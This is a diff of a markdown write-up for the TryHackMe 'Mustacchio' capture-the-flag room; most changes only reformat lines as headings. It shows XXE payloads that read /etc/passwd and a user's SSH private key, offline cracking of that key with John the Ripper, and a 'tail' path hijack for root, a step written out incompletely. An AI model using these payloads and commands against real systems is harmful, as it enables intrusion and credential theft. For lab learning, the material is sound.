@@ -10,54 +10,54 @@ comments: false
 [Link To CTF](https://tryhackme.com/room/mustacchio)
 <br>
 <br>
-Our nmap scan shows ports 80 and 22 are open
+## Our nmap scan shows ports 80 and 22 are open
 
-Navigating to the home webpage we don't see much
-Let's eumerate the hidden directories
+## Navigating to the home webpage we don't see much
+## Let's eumerate the hidden directories
 <br>
-Our scan shows:
-/robots.txt and /custom
+## Our scan shows:
+## /robots.txt and /custom
 
-/robots.txt -> shows nothing
+## /robots.txt -> shows nothing
 
-Enumerating /custom further we see subdirectory /js
-/custom/js -> shows users backup file
+## Enumerating /custom further we see subdirectory /js
+## /custom/js -> shows users backup file
 <br>
-We will use strings to read the file
-strings shows:
+## We will use strings to read the file
+## strings shows:
 
 
 Note: 
 The cat command may not work as expected for a .bak file primarily because .bak files are often binary files, not plain text files. The cat command is designed to print the raw contents of a file to the terminal, which works well for human-readable text but produces gibberish for binary data
 <br>
-We now get a password hash
-We will use an online cracker to attempt to crack the hash:
-[hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
+## We now get a password hash
+## We will use an online cracker to attempt to crack the hash:
+### [hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)
 
-We now get the cracked hash:  bulldog19
+## We now get the cracked hash:  bulldog19
 <br>
 I got stuck here.
 I did not see any login pages
 And ssh with the password was also failing
 Lets go back and see what we missed...
 <br>
-AHH, so nmap -p- shows higher port open: 8765
-Navigating here shows the admin panel login page
+## AHH, so nmap -p- shows higher port open: 8765
+## Navigating here shows the admin panel login page
 
 
 
-The credentials we gathered are accepted here
-Logging in we see a message board
-Putting in random text gives un an error
+## The credentials we gathered are accepted here
+## Logging in we see a message board
+## Putting in random text gives un an error
 <br>
-Let's send another request and capture the response in burpsuite
-Looking at the response we can see:
+## Let's send another request and capture the response in burpsuite
+## Looking at the response we can see:
 1. username: Barry
 2. ssh is allowed with the correct key
 3. there is a directory /auth/dontforget.bak
 <br>
-Looking at this directy path,
-We can see the xml format we will need to use:
+## Looking at this directy path,
+## We can see the xml format we will need to use:
 
 " <?xml version="1.0" encoding="UTF-8"?>
 
@@ -69,11 +69,11 @@ We can see the xml format we will need to use:
 
 <br>
 <br>
-It looks like this is vulnerable to a XXE injection
-Let's check out example exploits found below:
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe
+## It looks like this is vulnerable to a XXE injection
+## Let's check out example exploits found below:
+## https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe
 <br>
-Let's modify and test the basic blind XXE vulnerability:
+## Let's modify and test the basic blind XXE vulnerability:
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
@@ -84,7 +84,7 @@ Let's modify and test the basic blind XXE vulnerability:
 </comment>
 
 <br>
-This works, Lets now try and get barries credentials:
+## This works, Lets now try and get barries credentials:
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
@@ -95,45 +95,45 @@ This works, Lets now try and get barries credentials:
 </comment>
 
 -----------------
-We now get the ssh id_rsa key for barry
+## We now get the ssh id_rsa key for barry
 <br>
-We can save this to text file:
+## We can save this to text file:
 > nano id_rsa
 
-We will then lower the permissions:
+## We will then lower the permissions:
 > chmod 600 id_rsa
 
-Now use sshjohn to create hash 
+## Now use sshjohn to create hash 
 > ssh2john id_rsa > hash
 
-Then use JTR to crack hash
+## Then use JTR to crack hash
 > john -w=/usr/share/wordlists/rockyou.txt mustacchio_hash
 
-Now we can login with ssh using our new credentials
+## Now we can login with ssh using our new credentials
 > ssh -i id_rsa barry@<target_IP>
 > password: uriel james
 <br>
-We now have a shell and can get user flag !!!!
+## We now have a shell and can get user flag !!!!
 <br>
 <br>
 <br>
 # priv esc
 <br>
 <br>
-Looking around,
-We see another user
-There is an accessible elf file we can read
+## Looking around,
+## We see another user
+## There is an accessible elf file we can read
 <br>
-Running strings we see that its calling another file using tail
-We dont have permission to access to this file
+## Running strings we see that its calling another file using tail
+## We dont have permission to access to this file
 <br>
-Lets hijack the "tail" command:
+## Lets hijack the "tail" command:
 
-Navigate to /tmp:
+## Navigate to /tmp:
 echo "/bin/bash" > tail
 
-run the live_log:
+## run the live_log:
 /home/joe/live_log
 
-We are now root
-Let's catpure the root flag and pwn the machine !!!
+## We are now root
+## Let's catpure the root flag and pwn the machine !!!
